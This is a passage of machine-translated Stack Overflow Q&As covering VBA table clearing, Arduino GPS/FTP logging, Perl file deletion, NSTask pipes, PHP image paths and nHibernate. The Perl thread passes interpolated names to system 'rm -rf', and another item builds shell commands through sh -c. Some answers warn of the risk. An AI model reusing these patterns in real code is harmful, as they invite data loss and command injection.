'   Range({more than one cell}).SpecialCells({whatever}) seems to work off the specified cells.
' https://stackoverflow.com/questions/40537537/range-specialcells-clearcontents-clears-whole-sheet-instead

    On Error Resume Next

    With lst
        '.Range.Worksheet.Activate ' Enable this if you are debugging 

        If .ShowAutoFilter Then .AutoFilter.ShowAllData
        If .DataBodyRange.Rows.Count = 1 Then Exit Sub ' Table is already clear
        .DataBodyRange.Offset(1).Rows.Clear

        If .DataBodyRange.Columns.Count > 1 Then ' Check to see if SpecialCells is going to evaluate just one cell.
            .DataBodyRange.Rows(1).SpecialCells(xlCellTypeConstants).ClearContents
        ElseIf Not .Range.HasFormula Then
            ' Only one cell in range and it does not contain a formula.
            .DataBodyRange.Rows(1).ClearContents
        End If

        .Resize .Range.Rows("1:2")

        .HeaderRowRange.Offset(1).Select

        ' Reset used range on the sheet
        Dim X
        X = .Range.Worksheet.UsedRange.Rows.Count 'see J-Walkenbach tip 73

    End With

End Sub 
```

我包含的最后一个步骤是归因于 John Walkenbach 的提示，有时称为`J-Walkenbach tip 73` [自动重置最后一个单元格](http://spreadsheetpage.com/index.php/tip/automatically_resetting_the_last_cell/)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2016-02-04T16:44:45.830

我使用此代码删除我的数据，但将公式保留在第一行。它还会删除除顶行之外的所有行并将页面向上滚动到顶部。

```
Sub CleanTheTable()
    Application.ScreenUpdating = False
    Sheets("Data").Select
    ActiveSheet.ListObjects("TestTable").HeaderRowRange.Select
    'Remove the filters if one exists.
    If ActiveSheet.FilterMode Then
    Selection.AutoFilter
    End If
    'Clear all lines but the first one in the table leaving formulas for the next go round.
    With Worksheets("Data").ListObjects("TestTable")
    .Range.AutoFilter
    On Error Resume Next
    .DataBodyRange.Offset(1).Resize(.DataBodyRange.Rows.Count - 1, .DataBodyRange.Columns.Count).Rows.Delete
    .DataBodyRange.Rows(1).SpecialCells(xlCellTypeConstants).ClearContents
    ActiveWindow.SmallScroll Down:=-10000

    End With
Application.ScreenUpdating = True
End Sub 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-06-16T09:20:28.723

如果要删除除标题和公式之外的整个表格，可以尝试以下操作：

```
Sub DeteteTableExceptFormula()
    Dim tb As ListObject
    Set tb = activeworksheet.ListObjects("MyTable")
    tb.DataBodyRange.Delete
End Sub 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2021-06-11T10:34:07.917

如果您只想清除表格内容，我通常会使用非常简单的东西。

```
Sub Clear_table()
Range("Table1").ClearContents
End Sub 
```

显然，如果您有一个包含多个页面的工作簿，您可能需要更改代码以适应它。

```
Sub Clear_table()
Worksheets("Sheet1").Range("Table1").ClearContents
End Sub 
```

# c++ - 初始化 asio::ip::address_v6() 的最快方法？

> ID：10220912
> 
> 赞同：4
> 
> 时间：2012-04-19T02:37:45.343
> 
> 标签：c++, boost, initialization, ip-address, boost-asio

`asio::ip::address_v6`接受`bytes_type`一个参数，它基本上是`boost::array`网络字节顺序的。

`void *`我在变量中有一个 RAW IPv6 地址。`void *`将 a变成 a的最快方法是`asio::ip::address_v6`什么？最好使用构造函数。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-19T03:11:01.603

你不能比初始化一个更好的了`asio::ip::address_v6::bytes_type`，它实际上可以是 a`std::array`或 a `boost::array`：

```
// We need an unsigned char* pointer to the IP address
unsigned char *youraddr = reinterpret_cast<unsigned char*>(your_void_ptr);
asio::ip::address_v6::bytes_type myaddr;
// Copy the address into our array
std::copy(youraddr, youraddr + myaddr.size(), myaddr.data());
// Finally, initialize.
asio::ip::address_v6 ipv6(myaddr); 
```

请注意，如果您能够修改该结构，显然直接存储 a`bytes_type`而不是 that会更好。`void*`

# text - 如何使用 Arduino 发送文本文件并附加它

> ID：10220918
> 
> 赞同：0
> 
> 时间：2012-04-19T02:38:20.443
> 
> 标签：text, gps, arduino

我正在做一个 GPS 记录器项目。我有一个带有发射器和接收器以及 GPS 和 GSM 模块的[Arduino Mega 。](http://arduino.cc/en/Main/ArduinoBoardMega)我还有一个带有发射器、接收器和蜂鸣器的[Arduino Uno 。](http://arduino.cc/en/Main/ArduinoBoardUno)

当两个设备相距太远时，GPS 数据会被提取并使用 GSM 模块发送到我的网络服务器。当我将文件发送到服务器时，它会创建一个文本文件，当我移动到另一个位置时，它会覆盖以前的位置。

我试图弄清楚如何附加文本文件而不是覆盖它。我发现了很多使用 SD 卡屏蔽的东西，但没有它就什么都没有。

```
#define GPS_PIN_1       9       // GPS serial pin RX
#define GPS_PIN_2       8       // GPS serial pin TX
#define CHECKPIN        13      // Pin that lights up when things are checked
#define GPSRATE         4800    // GPS baud rate

#include <SoftwareSerial.h>
#include <Flash.h>
#include <Streaming.h>

// How many bytes of input to buffer from the GPS?
#define BUFFERSIZE      100      
#define ENDLN           

int rx1Pin=31; 
int txPin=30;  
int tx1Pin=11;  
int onModulePin = 2;
int rxPin=12;
SoftwareSerial mySerial = SoftwareSerial(GPS_PIN_1, GPS_PIN_2);  //(rx,tx)
SoftwareSerial txSerial = SoftwareSerial(rxPin, txPin);
SoftwareSerial rxSerial = SoftwareSerial(rx1Pin, tx1Pin);
char sendChar ='H';
char incomingChar = 0;
int counter=0;

//GPS variables
int numSats = 0;
int fixType = 0;
int time[] = {
  0, 0, 0};
double latitude = 0.0;
double longitude = 0.0;
long altitude = 0;
long maxAlt = 0;
int speed = 0;
int txCount = 0;
int ExOnce = 0;
int FalcomCheck = 0;
int LogCheck =0;
unsigned long GpsOffTime = 0;  
unsigned long SmsStart = 0;     // SMS-time
char buffer[BUFFERSIZE];

void switchModule(){            // Function to switch the module ON;
  digitalWrite(onModulePin,HIGH);
  delay(2000);
  digitalWrite(onModulePin,LOW);
  delay(2000);
}

void setup(){
  pinMode(rxPin, INPUT);
  pinMode(txPin,OUTPUT);
  pinMode(rx1Pin, INPUT);
  pinMode(tx1Pin,OUTPUT);
  pinMode(GPS_PIN_1, INPUT);
  pinMode(GPS_PIN_2, OUTPUT);
  pinMode(7, OUTPUT);
  pinMode(13, OUTPUT);
  digitalWrite(7, HIGH);
  pinMode(onModulePin, OUTPUT);

  txSerial.begin(4800);
  rxSerial.begin(4800);
  mySerial.begin(4800);
  Serial.begin(19200);      // The GPRS baud rate
  switchModule();           // Switch the module ON

  for (int i=0;i<2;i++){    // Wait 20 sec for connection
    delay(10000);                        
  } 
}

void loop(){
  txSerial.println(sendChar);
  Serial.println(sendChar);

  for(int i=0; i<6; i++) {
    incomingChar = rxSerial.read(); //Read incoming message from TX.

    if (incomingChar =='L') {
      GPS();//Serial.println("It Works");
    }
  }
}

void GPS(){
  Serial.flush();

  // Get a GGA string from the GPS, and
  // check if it's a valid fix, and extract the data.
  getNMEA("$GPGGA");    
  delay(100);
  numSats = getSats();
  fixType = getFixType();
  // Make sure we have a valid fix
  if (fixType != 0) {
    getTime(time);
    latitude = getLat();
    longitude = getLong();
    altitude = getAlt();

    // Keep track of the maximum altitude
  }     

  // Convert latitude and longitude into strings.
  char latString[12]; 
  char longString[12];
  doubleToString(latitude, 4, latString);
  doubleToString(longitude, 4, longString);

  sprintf(buffer, "%02d:%02d:%02d,%s,%s,%ld", 
    time[0], time[1], time[2], latString, longString, altitude);
  Serial.println(buffer);

  if (fixType > 0) {
    if (ExOnce==0){
      digitalWrite(13, HIGH);
      //ExOnce=1;
      sendsms();
      logftp();
      // for (int i=0; i<3; i++) {    // Wait 30 sec for a connection.
      //   delay(10000);                        
      // } 
    }
  }

  delay(200);
}

void sendsms(){ 
  Serial.println("AT+CMGF=1");         // Set the SMS mode to text. 
  delay(500);
  Serial.print("AT+CMGS=");            // Send the SMS the number.
  Serial.print(34,BYTE);               // Send the " char.
  Serial.print("**********");          // Send the number change ********* 
                                       // by the actual number.
  Serial.println(34,BYTE);             // Send the " char.
  delay(1500); 
  Serial.print("Hi this is the General text testing."); // The SMS body
  delay(500);
  Serial.print(0x1A,BYTE);             // End of message command 1A (hex)

  delay(20000);
 }

void logftp(){ 
  Serial.println("AT&k3");         // Flow activate

  delay(1000);
  Serial.print("AT+KCNXCFG=0,");     // Connect to GPRS
  Serial.print(34,BYTE);
  Serial.print("GPRS");
  Serial.print(34,BYTE);
  Serial.print(",");
  Serial.print(34,BYTE);
  //Serial.print("wap.cingular");
  Serial.print("epc.tmobile.com");
  Serial.print(34,BYTE);
  Serial.print(",");
  Serial.print(34,BYTE);
  Serial.print(34,BYTE);
  Serial.print(",");
  Serial.print(34,BYTE);
  Serial.println(34,BYTE);

  delay(1000);
  Serial.println("AT+KCNXTIMER=0,60,2,70");   // Set timers

  delay(1000);
  Serial.println("AT+CGATT=1");               // Network check

  delay(1000);
  Serial.print("AT+KFTPCFG=0,");    //FTP configuration/connect
  Serial.print(34,BYTE);
  Serial.print("ftp.insertaddress.com");  //FTP address
  Serial.print(34,BYTE);
  Serial.print(",");
  Serial.print(34,BYTE);
  Serial.print("username");     //Username
  Serial.print(34,BYTE);
  Serial.print(",");
  Serial.print(34,BYTE);
  Serial.print("password");       //Password
  Serial.print(34,BYTE);
  Serial.println(",21,0");        //Port         

  delay(500);
  Serial.print("AT+KPATTERN=");     
  Serial.print(34,BYTE);
  Serial.print("--EOF--Pattern--");
  Serial.println(34,BYTE);

  delay(500);
  Serial.print("AT+KFTPSND=0,,");
  Serial.print(34,BYTE);
  Serial.print("log");          //Directory folder of FTP
  Serial.print(34,BYTE);
  Serial.print(",");
  Serial.print(34,BYTE);
  Serial.print("pol.txt");      //Text file
  Serial.print(34,BYTE);
  Serial.println(",0");

  delay(12000);       

  Serial.print(buffer);   
  Serial.println("--EOF--Pattern--"); 
  delay(12000);

  Serial.println("AT+KTCPCLOSE=1,1"); 
  delay(1000);
} 

// ------- GPS Parsing ----------

// Reads a line from the GPS NMEA serial output
// Give up after trying to read 1000 bytes (~2 seconds)
int readLine(void) {
  char c;
  byte bufferIndex = 0;
  boolean startLine = 0;
  byte retries = 0;
  while (retries < 20) {
    c = mySerial.read();

    if (c == -1) { 
      delay(2); 
      continue; 
    }

    if (c == '\n') continue;
    if (c == '$') startLine = 1;
    if ((bufferIndex == BUFFERSIZE-1) || (c == '\r')) {
      if (startLine) {
        buffer[bufferIndex] = 0;
        return 1;
      }
    }
    if (startLine)
      buffer[bufferIndex++] = c;
    //} 
    else {
      retries++;
      delay(50);
    }
  }
  return 0;
}

// Returns a specific field from the buffer
void getField(int getId, char *field, int maxLen) {
  byte bufferIndex = 0;
  byte fieldId = 0;
  byte i = 0;
  while (bufferIndex < sizeof(buffer)) {
    if (fieldId == getId) {
      // End of string, or string overflow
      if (buffer[bufferIndex] == ',' || i > (maxLen - 2)) {
        field[i] = 0;   // Null terminate
        return;
      }
      // Buffer chars to field
      field[i++] = buffer[bufferIndex++];
    } 
     else {
      // Advance field on comma
      if (buffer[bufferIndex] == ',') {
        bufferIndex++;          //Advance in  buffer
        fieldId++;              // Increase field     position counter
      } 
      else {
        bufferIndex++;          // Advance in  buffer
      }
    }
  }
  // Null terminate incase we didn't already..
  field[i] = 0;
}

// Polls for an NMEA sentence of type requested
// Validates checksum, silently retries on failed checksums
int getNMEA(char *getType) {
  char type[7];
  byte retries = 0;
  while (retries < 2) {
    if (readLine() && validateChecksum()) {
      ;
      getField(0, type, sizeof(type));
      if (strcmp(type, getType) == 0) {
        return 1;
      }
    } 
    else {
      retries++;
     }
  }
  Serial.println("Failed to read GPS");

  return 0;
}

// Validates the checksum on an NMEA string
// Returns 1 on valid checksum, 0 otherwise
int validateChecksum(void) {
  char gotSum[2];
  gotSum[0] = buffer[strlen(buffer) - 2];
  gotSum[1] = buffer[strlen(buffer) - 1];
  // Check that the checksums match up
  if ((16 * atoh(gotSum[0])) + atoh(gotSum[1]) == getCheckSum(buffer))
    return 1;
  else
    return 0;
}

// Calculates the checksum for a given string
// returns as integer
int getCheckSum(char *string) {
  int i; 
  int XOR;  
  int c;
  // Calculate checksum ignoring any $'s in the string
  for (XOR = 0, i = 0; i < strlen(string); i++) {
    c = (unsigned char)string[i];
    if (c == '*') break;
    if (c != '$') XOR ^= c;
  }
  return XOR;
}

// Returns the groundspeed in km/h
int getSpeed(void) {
  char field[10];
  getField(7, field, sizeof(field));
  int speed = atoi(field);
  return speed;
}

// Return the fix type from a GGA string
int getFixType(void) {
  char field[5];
  getField(6, field, sizeof(field));
  int fixType = atoi(field);
  return fixType;
}

// Return the altitude in meters from a GGA string
long getAlt(void) {
  char field[10];
  getField(9, field, sizeof(field));
  long altitude = atol(field);
  return altitude;
}

// Returns the number of satellites being tracked from a GGA string
int getSats(void) {
  char field[3];
  getField(7, field, sizeof(field));
  int numSats = atoi(field);
  return numSats;
}

// Read the latitude in decimal format from a GGA string
double getLat(void) {
  char field[12];
  getField(2, field, sizeof(field));   // read the latitude
  double latitude = atof(field);       // convert to a  double (precise)
  int deg = (int) latitude / 100;      // extract the number of degrees
  double min = latitude - (100 * deg); // work out the number of minutes
  latitude = deg + (double) min/60.0;  // convert to decimal format
  getField(3, field, sizeof(field));   // get the hemisphere (N/S)

  // sign the decimal latitude correctly
  if (strcmp(field, "S") == 0)
    latitude *= -1;

  return latitude;
}

// Read the longitude in decimal format from a GGA string
double getLong(void) {
  char field[12];
  getField(4, field, sizeof(field));    // read the longitude
  double longitude = atof(field);       // convert to a double
  int deg = (int) longitude / 100;      // extract the number of degrees
  double min = longitude - (100 * deg); // work out the number of minutes
  longitude = deg + (double) min/60.00; // convert to decimal format
  getField(5, field, sizeof(field));    // get the E/W status

  // sign decimal latitude correctly
  if (strcmp(field, "W") == 0) 
    longitude *= -1;

  return longitude;
}

// Converts UTC time to the correct timezone
void convertTime(int *time) {
  // How many hours off GMT are we?
  float offset = -5;
  long sectime = ((long)(time[0]) * 3600) + (time[1] * 60) + time[2];
  sectime += (offset * 3600.0);
  // Did we wrap around?
  if (sectime < 0) sectime += 86400;
  if (sectime > 86400) sectime -= 86400;
  // Convert back to time
  time[0] = (int)(sectime / 3600);
  time[1] = (int)((sectime % 3600) / 60);
  time[2] = (int)((sectime % 3600) % 60);
}

// Parses a time field from a GGA string
void parseTime(char *field, int *time) {
  char tmp[3]; 
  tmp[2] = 0; // Init tmp and null terminate
  tmp[0] = field[0]; 
  tmp[1] = field[1]; 
  time[0] = atoi(tmp); // Hours
  tmp[0] = field[2]; 
  tmp[1] = field[3]; 
  time[1] = atoi(tmp); // Minutes
  tmp[0] = field[4]; 
  tmp[1] = field[5]; 
  time[2] = atoi(tmp); // Seconds
}

// Gets the hours, minutes and seconds from a GGA string
void getTime(int *time) {
  char field[12];
  getField(1, field, sizeof(field));
  parseTime(field, time);
  convertTime(time);
}

// ------ MISC ----------

// Returns a string with a textual representation of a float
void doubleToString(double val, int precision, char *string){

  // Print the int part
  sprintf(string, "%d", (int)(val));
  if(precision > 0) {
    // Print the decimal point
    strcat(string, ".");
    unsigned long frac;
    unsigned long mult = 1;
    int padding = precision -1;
    while (precision--) { 
      mult *=10; 
    }
    if (val >= 0)
      frac = (val - (int)(val)) * mult;
    else
      frac = ((int)(val)- val ) * mult;
    unsigned long frac1 = frac;
    while (frac1 /= 10) { 
      padding--; 
    }
    while (padding--) { 
      strcat(string, "0"); 
    }

    // Convert and print the fraction part
    sprintf(string+strlen(string), "%d", (int)(frac));
  }
}

// Converts a HEX string to an int
int atoh(char c) {
  if (c >= 'A' && c <= 'F')
    return c - 55;
  else if (c >= 'a' && c <= 'f')
    return c - 87;
  else
    return c - 48;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T18:03:52.303

If the server is where the text file is received via SMS/GSM, that server program controls how the file is written or appended. Your posted Arduino code would not need to be changed. On the server, where you now open the file - first check if the file exists and if it does, change the `open` function to add append mode. Exactly how depends on the OS/language of your server program. But you should be able to figure it out from reading the documentation on the `open` call.

# perl - Perl：如何使用“rm”删除文件、文件夹和子目录？

> ID：10220919
> 
> 赞同：-2
> 
> 时间：2012-04-19T02:38:36.720
> 
> 标签：perl

我正在尝试使用我的 perl 脚本删除文件和文件夹。我正在使用“rm -rf $file”命令来删除文件，但它什么也没做。但是，当我在 cmd 行上尝试相同的命令时，它可以正常工作并删除文件。附上代码片段。任何帮助表示赞赏。

```
for each $f (@files)
{
       system "rm -rf $f";
} 
```

我在几台机器上试过这个，同样的问题。但是，我尝试使用其他系统命令，例如 mkdir、tar 等，它工作得很好。我也尝试过取消链接，但同样的问题仍然存在。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-19T03:08:54.113

您可以使用`for`or `foreach`，但没有`for each`。我已经运行了代码，一旦我修复了这个，文件就被删除了。

使用`use strict;`会发现这一点，因为“每个”都会显示为一个空词。

这是我使用的代码：

```
#!/usr/bin/perl

use warnings;
use strict;

my @files = qw( a.txt b.txt c.txt );

for my $f (@files)
{
   system "rm -rf $f";
} 
```

这成功删除了`a.txt`,`b.txt`和`c.txt`，所以我保证它是工作代码。

使用 perl 调试器检查 @files，并检查您尝试删除的所有文件的权限。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-05-30T09:07:13.063

```
use File::Path;
rmtree('folder_path');  #rmtree('/tmp/test'); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-19T08:42:45.183

如果您的`@files`阵列中只有文件而不是文件夹，那么您也可以使用`unlink`删除文件的命令。这可能比使用`rm -rf`. 如果该元素`/`以某种方式进入您的阵列，那么您最终可能会遇到带有`rm -rf`. [在 perldoc 上取消链接](http://perldoc.perl.org/functions/unlink.html)。

```
unlink @files; 
```

# javascript - 有什么比 javascript 中的对象数组更有效地存储大量数据的吗？

> ID：10220924
> 
> 赞同：1
> 
> 时间：2012-04-19T02:39:26.220
> 
> 标签：javascript

我的应用程序每秒收集 10 次加速度，因此我需要存储数千行数据。目前我有一个对象，它是其他对象的列表来存储它——还有什么比这更有效的吗？

```
var arr = [];

function dataPoint(x, y, z, tstamp) {
    this.xAccel = x;
    this.yAccel = y;
    this.zAccel = z;
    this.epoch = tstamp;
}

var dp = new dataPoint( acceleration.x, acceleration.y, acceleration.z, acceleration.timestamp );

arr.push(dp); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T02:49:54.713

如果您的目标平台支持[类型化数组](https://www.khronos.org/registry/typedarray/specs/latest/)，那么这些可能会更有效。

*   [规格](https://www.khronos.org/registry/typedarray/specs/latest/)
*   [MDN 的文档](https://developer.mozilla.org/en/JavaScript_typed_arrays)

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-04-19T05:29:21.033

查看您的代码：

```
> var arr = [];  
> function dataPoint(x, y, z, tstamp) {
>     this.xAccel = x;
>     this.yAccel = y;
>     this.zAccel = z;
>     this.epoch = tstamp;
> }
> var dp = new dataPoint( acceleration.x, acceleration.y,
>          acceleration.z, acceleration.timestamp );
> arr.push(dp); 
```

我不明白你为什么要打扰构造函数，你可以简单地做（缩写）：

```
 arr.push({x: acc.x, y: acc.y, z: acc.z, epoch: acc.timestamp}); 
```

虽然我可能会更改`epoch`为`t`. 鉴于你有这样简单的结构，为什么不：

```
 arr.push([acc.x, acc.y, acc.z, acc.timestamp]); 
```

并按索引引用成员。构造函数的优点是继承方法，但如果你只有一层继承，简单的函数只是一种有效的并且执行起来可能更快（与`[[Prototype]]`链相比，全局对象的查找通常非常快，但请参阅下面的警告）

顺便说一句，我认为在错误的上下文中使用了*epoch这个名称。*一个纪元是一个参考点，因此您可能有一个纪元，例如 2012-04-20T18:53:21.098Z，然后以毫秒或秒为单位具有增量。javascript 时间参考的纪元（即返回的值`Date.prototype.getTime`）是 1970-01-01T00:00:00Z，时间参考是一个增量。

### 警告

关于什么是“最好的”，我认为您的标准是“最快的”，但需要注意的是代码仍然必须相当清晰和可维护。最好的办法是避免明显的速度问题，然后在各种浏览器中进行测试并根据结果进行优化。一个浏览器中的优化可能与其他浏览器几乎没有差异或没有差异，或者可能会明显变慢。例如，在大多数浏览器中，递减循环过去更快，但在 Opera 中要慢得多。此外，评估循环条件中的表达式，例如：

```
 while ((el = node.firstChild)) 
```

曾经比以下慢得多：

```
 while (el) {
    el = node.firstChild 
```

但对于较新的浏览器，这似乎并不重要。同样，for 循环与 while 和 do 循环一样快（通常）。但需要更多的输入来设置。

# ruby - 在 Git Hooks 中使用 Ruby 执行 Powershell 命令

> ID：10220927
> 
> 赞同：0
> 
> 时间：2012-04-19T02:39:38.923
> 
> 标签：ruby, git, powershell, nunit

我在 Windows 上使用 Git 并尝试在工作流程中包含单元测试。如果提交消息包含关键字。*commit-msg*钩子将触发 Powershell 命令来运行一些 Nunit 测试。

这是我的红宝石代码

```
#!/usr/bin/env ruby
message_file = ARGV[0]
message = File.read(message_file)

puts "The commit message is " + message

$regex = /(#runtest)/

if $regex.match(message)
    exec 'powershell.exe -ExecutionPolicy RemoteSigned -Command {RunNunitTestCase}'
end 
```

但是，当我提交更改时，结果如下所示。exec 行已运行但什么也不做。

```
PS D:\testfolder> git commit -am '#runtest'
The commit message is #runtest
[authorupdate b14878d] 123
 1 files changed, 1 insertions(+), 0 deletions(-) 
```

我是 ruby​​ 和 powershell 的新手。如果此工作流程可行或您有更好的方法，请随时发表评论。

谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-24T06:14:53.680

大括号需要转义。

```
exec "powershell.exe -ExecutionPolicy RemoteSigned -Command & \{RunNunitTestCase\} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T09:14:33.027

我尝试了 exec 行的确切脚本：

```
exec 'powershell.exe -ExecutionPolicy RemoteSigned -Command gps' 
```

它确实打印出了`gps`我做的时候的输出`git commit -m "#runtest"`

所以它确实运行命令并且它确实有效。

确保您正在执行的任何操作都有效。抓住 powershell 行并直接在命令行上试用。

# objective-c - 具有多个管道输入的 NSTask

> ID：10220928
> 
> 赞同：3
> 
> 时间：2012-04-19T02:39:44.967
> 
> 标签：objective-c, cocoa, nstask, nspipe

我正在尝试使用管道来处理需要多个输入的命令，但不太确定该怎么做。这是我正在尝试做的一个片段。我知道如何处理第一个输入，但我对第二个输入中的管道感到迷茫`-newstdinpass`

```
NSTask *task = [[NSTask alloc] init];
NSPipe *pipe = [NSPipe pipe];

[task setLaunchPath: @"/bin/sh"];
[task setArguments: [NSArray arrayWithObjects: @"-c", @"/usr/bin/hdiutil chpass -oldstdinpass -newstdinpass /path/to/dmg", nil]];
[task setStandardInput:pipe];
[task launch];

[[pipe fileHandleForWriting] writeData:[@"thepassword" dataUsingEncoding:NSUTF8StringEncoding]];
[[pipe fileHandleForWriting] closeFile];

[task waitUntilExit];
[task release]; 
```

所以我知道`hdiutil`以这种方式使用有点麻烦，但就管道而言，我是否以正确的方式进行操作？

谢谢。

**更新**：如果其他人对此感到疑惑，我的问题的一个快速解决方案是传递一个以 null 结尾的字符串，正如 Ken Thomases 在下面指出的那样。`[[NSString stringWithFormat:@"oldpass\0newpass\0"] dataUsingEncoding:NSUTF8StringEncoding]`入管使用。现在，仍然需要学习如何`NSTasks`用管道桥接多个......

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-19T02:45:10.893

您可以创建多个`NSTask`s 和一堆`NSPipe`s 并将它们连接在一起，或者您可以使用该`sh -c`技巧向 shell 提供命令，并让它解析它并设置所有 IPC。

**例子 ：**

```
NSTask *task;
task = [[NSTask alloc] init];
[task setLaunchPath: @"/bin/sh"];

NSArray *arguments;
arguments = [NSArray arrayWithObjects: @"-c",
                     @"cat /usr/share/dict/words | grep -i ham | rev | tail -5", nil];
[task setArguments: arguments];
// and then do all the other jazz for running an NSTask. 
```

**参考：** [http ://borkware.com/quickies/one?topic=nstask](http://borkware.com/quickies/one?topic=nstask)

* * *

现在，至于“正确”的命令执行功能，这是我通常使用的...

**代码 ：**

```
/*******************************************************
 *
 * MAIN ROUTINE
 *
 *******************************************************/

- (void)runCommand:(NSString *)cmd withArgs:(NSArray *)argsArray
{
    //-------------------------------
    // Set up Task
    //-------------------------------

    if (task) { [self terminate]; }

    task = [[NSTask alloc] init];
    [task setLaunchPath:cmd];
    [task setArguments:argsArray];

    [task setStandardOutput:[NSPipe pipe]];
    [task setStandardError:[task standardOutput]];

    //-------------------------------
    // Set up Observers
    //-------------------------------

    [PP_NOTIFIER removeObserver:self];
    [PP_NOTIFIER addObserver:self 
                    selector:@selector(commandSentData:) 
                        name: NSFileHandleReadCompletionNotification 
                      object: [[task standardOutput] fileHandleForReading]];

    [PP_NOTIFIER addObserver:self 
                    selector:@selector(taskTerminated:) 
                        name:NSTaskDidTerminateNotification 
                      object:nil];

    //-------------------------------
    // Launch
    //-------------------------------
    [[[task standardOutput] fileHandleForReading] readInBackgroundAndNotify];

    [task launch];
}

/*******************************************************
 *
 * OBSERVERS
 *
 *******************************************************/

- (void)commandSentData:(NSNotification*)n
{
    NSData* d;
    d = [[n userInfo] valueForKey:NSFileHandleNotificationDataItem];

    if ([d length])
    {
        NSString* s = [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding];

        NSLog(@"Received : %@",s);
    }

    [[n object] readInBackgroundAndNotify]; 
}

- (void)taskTerminated:(NSNotification*)n
{
    [task release];
    task = nil;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-19T03:35:56.100

你对管道的使用对我来说是正确的。

我不确定你为什么使用`/bin/sh`. 只需设置`NSTask`，其启动路径为`@"/usr/bin/hdiutil"`，其参数为`@"chpass"`、`@"-oldstdinpass"`、`@"-newstdinpass"`和`@"/path/to/dmg"`. 这要安全得多。例如，如果 dmg 的路径包含一个 shell 会解释的字符，比如`$`?

除非您特别*想*利用 shell 功能，否则不要使用 shell。

# php - PHP 文件上传（图片）

> ID：10220932
> 
> 赞同：0
> 
> 时间：2012-04-19T02:40:18.977
> 
> 标签：php, mysql

只是一个快速的问题，伙计们。我在表单中使用“浏览”上传功能来选择图片并将其上传到我的数据库。目前，我的图像位于“图像”文件夹中，为了让它们显示，我需要在图像列中包含以下内容：

```
Images\picname1.jpg 
```

当我使用浏览上传功能时，我得到以下信息：

```
E:\xampp\htdocs\IDB\images\picname1.jpg 
```

在数据库中显示为：

```
picname1.jpg 
```

当然，由于不包括“图像”文件夹目录，图像将不会显示。

这是我的表格：

```
<font face="Arial"><b>Enter Image(Optional):</b></font><input type="file" name="imaAdd"   accept="image/gif"> 
```

谁能告诉我如何包含“图像目录！？我敢肯定这是我缺少的明显修复！

任何帮助都会很棒！

编辑：

她的我的形象呼应了伙计们。

```
 echo"<img src='".$row->Image."'>"; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T02:46:09.493

`'images/'`一种选择是在插入数据库时​​将字符串与图像文件名连接起来。

更好的选择可能是在显示图像时使用图像路径限定文件名。如果您可以向我们展示用于显示图像的代码，那应该很容易解决。

后一个选项的 PHP 代码可能如下所示：

`echo '<img src="images\' . $imagename . '" />';`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T02:49:12.440

我对您的要求感到有些困惑，如果我错了，请纠正我，但这就是您所拥有的：

一个上传系统，将图片上传到您的图像目录并将 imageName.jpg 添加到您的数据库中。并且您想为添加到数据库中的每个图像名称添加前缀“images\”？

如果是这种情况，在表单触发的 php 脚本中，您应该能够将图像名称设置为添加到数据库中，`'image\.$imagename'`假设 $imagename 作为图像的名称。

如果这不起作用，为什么不在访问 img 时为其添加前缀？`print '<img src=image\"'.$imagename.'" />` 希望有帮助。

# c# - nHibernate Expression.In 抛出异常

> ID：10220933
> 
> 赞同：0
> 
> 时间：2012-04-19T02:40:26.730
> 
> 标签：c#, nhibernate, fluent-nhibernate

我有这个工作正常的 nHibernate Critera

```
var amount = (decimal)Session.CreateCriteria<Transaction>()
    .Add(Expression.Eq("Account.Id", accountId))
    .SetProjection(Projections.ProjectionList()
        .Add(Projections.GroupProperty("Account.Id"))
        .Add(Projections.Sum("InvoiceGross"), "total"))
    .SetMaxResults(1)
    .SetResultTransformer(Transformers.AliasToEntityMap)
    .UniqueResult<IDictionary>()["total"]; 
```

但是当我开始`Expression.In`像这样添加时

```
var amount = (decimal)Session.CreateCriteria<Transaction>()
    .Add(Expression.Eq("Account.Id", accountId))
    .Add(Expression.In("StatusType.Id", statusTypes))
    .SetProjection(Projections.ProjectionList()
        .Add(Projections.GroupProperty("Account.Id"))
        .Add(Projections.Sum("InvoiceGross"), "total"))
    .SetMaxResults(1)
    .SetResultTransformer(Transformers.AliasToEntityMap)
    .UniqueResult<IDictionary>()["total"]; 
```

任何想法为什么会发生，顺便说一下**`statusTypes`**是一种**`int[]`**类型

它开始抛出异常`"Object reference not set to an instance of an object."`

这是我想要实现的 SQL Query

```
SELECT SUM(InvoiceGross) AS total
FROM  Transactions
WHERE (AccountID = @accountId) (statusTypeID IN (1,2,3,4))
GROUP BY AccountID 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T01:49:17.300

错误即被抛出，因为您没有从数据库中获得唯一的结果。您能否使用 SQL 探查器或 NHProf 监视生成的 sql，然后针对 db 运行它以查看查询是否确实在返回数据。

同样，在您开始使用 ResultTransformer 之前，只需将其转换为一个简单的列表，看看您是否获得了一个数组列表，其中 Account.Id 作为数组的第一项，总和是第二项，即尝试

```
var amount = (decimal)Session.CreateCriteria<Transaction>()
    .Add(Expression.Eq("Account.Id", accountId))
    .Add(Expression.In("StatusType.Id", statusTypes))
    .SetProjection(Projections.ProjectionList()
        .Add(Projections.GroupProperty("Account.Id"))
        .Add(Projections.Sum("InvoiceGross"), "total"))
    .SetMaxResults(1)
    .List();

var sum=amount[0][1]; 
```

# lisp - CLISP - 反转一个简单的列表

> ID：10220939
> 
> 赞同：2
> 
> 时间：2012-04-19T02:41:02.167
> 
> 标签：lisp, common-lisp, clisp

